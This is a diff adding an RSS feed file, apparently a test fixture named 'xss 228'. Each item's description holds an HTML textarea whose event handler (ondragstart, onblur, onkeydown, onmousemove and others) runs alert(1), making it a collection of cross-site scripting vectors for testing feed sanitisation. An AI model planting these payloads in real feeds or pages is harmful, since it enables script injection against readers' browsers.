@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 228</title>
+  <link>https://www.XSQQFRRWTVZQFMIKKLMV.com</link>
+  <description>AGFSTMPGVAQWMPXEBNWG</description>
+  <item>
+    <title>SBRYHTHUAHVICUBKHVYB</title>
+    <link>http://wwww.HYEOGHHVYNDMTQOBMQKPFJFWYLDOKXEHGVKXMZIS.com</link>
+    <description>
+      <textarea draggable="true" ondragstart="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>POZNPNJWJGOUEVWYJQGN</title>
+    <link>http://wwww.JZZTFTPLFURVUMQWJJZCHTJCTMPQDZATEHPAWGJC.com</link>
+    <description>
+      <textarea   onactivate=alert(1)></textarea>
+    </description>
+  </item>
+  <item>
+    <title>XUHAAKGYCILRQRFZNQQL</title>
+    <link>http://wwww.HFTADULLMXUNWHTMRKRNGNUUJEXCKZQVGALIBRBN.com</link>
+    <description>
+      <textarea   onbeforeactivate=alert(1)></textarea>
+    </description>
+  </item>
+  <item>
+    <title>EISYSWJPLGLSHICIAPPI</title>
+    <link>http://wwww.SFNQGQECLGJVMAOSQMCXNKGCIFDSLAIHKXHNRBXI.com</link>
+    <description>
+      <textarea   onbeforedeactivate=alert(1)></textarea><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>GMNRVSDDIKIEJWAXHWBK</title>
+    <link>http://wwww.INFNJLUVSHNOSDAFFHARJTTHVZRKUEXAWZPWRJQE.com</link>
+    <description>
+      <textarea   ondeactivate=alert(1)></textarea><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>ZAVXOCRYOQZUNNNFNRHO</title>
+    <link>http://wwww.JIQRAGRVHVLNSCRJHKDHHNLGXWUDRXYVKAEIQRKC.com</link>
+    <description>
+      <textarea onauxclick=alert(1)>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>DPNNUYNAOSAWMXBMELVY</title>
+    <link>http://wwww.FUGZJDFVNTVVXWHZDUWNBQZZAGRHOTYXIBGLPPQE.com</link>
+    <description>
+      <textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>WPHBTHUYVMNOIMCMMAJW</title>
+    <link>http://wwww.PFPIDKQBUTBMRUEACHXRJXPFFSEVHUJMCGNAOOXE.com</link>
+    <description>
+      <textarea onbeforecut=alert(1) autofocus>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>TRZWVQXVALPNESZTQNZI</title>
+    <link>http://wwww.VHREDLQXAFVEHOQFKODPFLMIXCCPOCCSPBGVCUOL.com</link>
+    <description>
+      <textarea onbeforepaste=alert(1) autofocus></textarea>
+    </description>
+  </item>
+  <item>
+    <title>UMNDJOWYCLXGFQBLMDLT</title>
+    <link>http://wwww.UWTISKIASOBNWKVBPWVPWFHZHGDAXXZDTWYFTBEV.com</link>
+    <description>
+      <textarea onblur=alert(1) ></textarea><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>ITFFKLEIKUBTAUNMTJKJ</title>
+    <link>http://wwww.FSWXUXEXUCQUUKJIPEXNTTVCNPXFHZDDKGGEQFEY.com</link>
+    <description>
+      <textarea onchange=alert(1)>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>FJOPHQPTZNARMTQSPRZE</title>
+    <link>http://wwww.KCPGWLSQXTAFXNRDHHXXADFXHCXZROVYQDHQRQFX.com</link>
+    <description>
+      <textarea onclick="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>HHIUVXJLPUXQPGOMBCGF</title>
+    <link>http://wwww.JNEBMESPUCIEBRWFJJOCNEDDTAQKCVHHRWEEDQYX.com</link>
+    <description>
+      <textarea oncontextmenu="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>XEJJDGHTRNWDFWOWODEN</title>
+    <link>http://wwww.OLMWIDREKBHXDPHAIIKMEQCEDWENUINSCLNGKUWC.com</link>
+    <description>
+      <textarea oncopy=alert(1) autofocus>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>WHKMYFPNYMGCNXKXLNJT</title>
+    <link>http://wwww.ROQGHWZDATJHOJMXDDHIKVEWQLPDWHEUJPPBPKIK.com</link>
+    <description>
+      <textarea oncut=alert(1) autofocus>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>CCEDNFUPEHUQXCTSHBCY</title>
+    <link>http://wwww.RTGBQWWDTAHCEKLJABVPUPLPWKNQIYEOGRJFKZFL.com</link>
+    <description>
+      <textarea ondblclick="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>SPDVYIQCDCTVKIFDLJDT</title>
+    <link>http://wwww.KOYLLERKYYGJQYPMZWDENNFTTJJNNCHLFMXNAWWO.com</link>
+    <description>
+      <textarea onfocusout=alert(1) ></textarea><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>WCKKLZCUOVHFXTMFNDGS</title>
+    <link>http://wwww.PVDUSWSKTIWDCEJSBDCPSRDWIZGCTZRRFXTPYOCG.com</link>
+    <description>
+      <textarea oninput=alert(1)>XSS</textarea>
+    </description>
+  </item>
+  <item>
+    <title>MZXVHCGJZUYMVJSQUVNR</title>
+    <link>http://wwww.AZYDITWLOOBMCHMNROYIKBRLRCXAJAVBUPEFAJAS.com</link>
+    <description>
+      <textarea onkeydown="alert(1)" contenteditable>test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>LWDDXATOGUYYSUWWBIYC</title>
+    <link>http://wwww.WLOPWTLGUIDHPHJLEKYCNMREFVZNUSFTIYFRBJEP.com</link>
+    <description>
+      <textarea onkeypress="alert(1)" contenteditable>test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>DAWPTOUMSXHSRVTTJURB</title>
+    <link>http://wwww.DWWZZTPUMCVWMDRCUEKAOHZYWPVOCYKLXSRXPSZC.com</link>
+    <description>
+      <textarea onkeyup="alert(1)" contenteditable>test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>GFKYUJBPBXUPIIOLYDLE</title>
+    <link>http://wwww.NWKHMLCIKITQLEJDCDZYFJZQMHZUPJUUFUNRRKDD.com</link>
+    <description>
+      <textarea onmousedown="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>JHKWGCPVBHJEYGCWATHP</title>
+    <link>http://wwww.XLQGMIBZMRJFGYHRZWLQYWCJKFLBRGBLPSDXCZNQ.com</link>
+    <description>
+      <textarea onmouseenter="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>VCJACUQXEUQLAOLUXZZW</title>
+    <link>http://wwww.ZPCZZRFKGOQYQNULYQHWVZKVADNMMLGCBHZFFNAA.com</link>
+    <description>
+      <textarea onmouseleave="alert(1)">test</textarea>
+    </description>
+  </item>
+  <item>
+    <title>PNBLKNWIQKTLKEDNMQTF</title>
+    <link>http://wwww.AEWUSWSCTNOFAKYWGUSNJJMZIXQIFUVXQGIYMACI.com</link>
+    <description>
+      <textarea onmousemove="alert(1)">test</textarea>
+    </description>
+  </item>
+</channel>
+</rss>
